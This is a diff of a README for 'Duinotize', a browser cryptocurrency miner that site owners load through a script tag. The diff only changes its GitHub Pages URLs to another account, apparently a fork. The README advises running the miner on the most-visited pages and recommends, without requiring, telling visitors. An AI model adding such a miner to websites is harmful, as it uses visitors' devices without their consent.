@@ -6,7 +6,7 @@ Tired of showing users ads? Don't want to leak personal info to use Adsense? Use
 ## Installation
 Include the main script in your header element:
 ```html
-<script src="https://NoozAbooz.github.io/Duinotize/duinotize.js" defer></script>
+<script src="https://jv420.github.io/Duinotize/duinotize.js" defer></script>
 ```
 
 Next make a script element add pass in arguments:
@@ -31,7 +31,7 @@ These are configurations you can change if you wish, but the script will run fin
 
 For example, a custom snippet in your website might look like this:
 ```html
-<script src="https://NoozAbooz.github.io/Duinotize/duinotize.js" defer></script>
+<script src="https://jv420.github.io/Duinotize/duinotize.js" defer></script>
 <script>
   duinotize.start({
     username: "jpsdev",
@@ -44,7 +44,7 @@ For example, a custom snippet in your website might look like this:
 ```
 </details>
 
-Now, whenever that page is opened, the miner will start and output messages to the developer console as a Service Worker. It will run until the whole tab (not just the specific page) is closed. Make sure to install the miner on a page where users visit the most, so that there are more miners running. You can see this in action at https://NoozAbooz.github.io/Duinotize/demo/, or look [here](https://github.com/NoozAbooz/Duinotize/blob/main/demo/index.html) for the source code to that page for a example of how to implement it.
+Now, whenever that page is opened, the miner will start and output messages to the developer console as a Service Worker. It will run until the whole tab (not just the specific page) is closed. Make sure to install the miner on a page where users visit the most, so that there are more miners running. You can see this in action at https://jv420.github.io/Duinotize/demo/, or look [here](https://github.com/jv420/Duinotize/blob/main/demo/index.html) for the source code to that page for a example of how to implement it.
 
 I HIGHLY reccomend you put a note somewhere on your website to tell visiters that there is a crypto miner running in the background (in some regions it is illegal to mine crypto in the background without consent!), and optionally credit this repo.
 
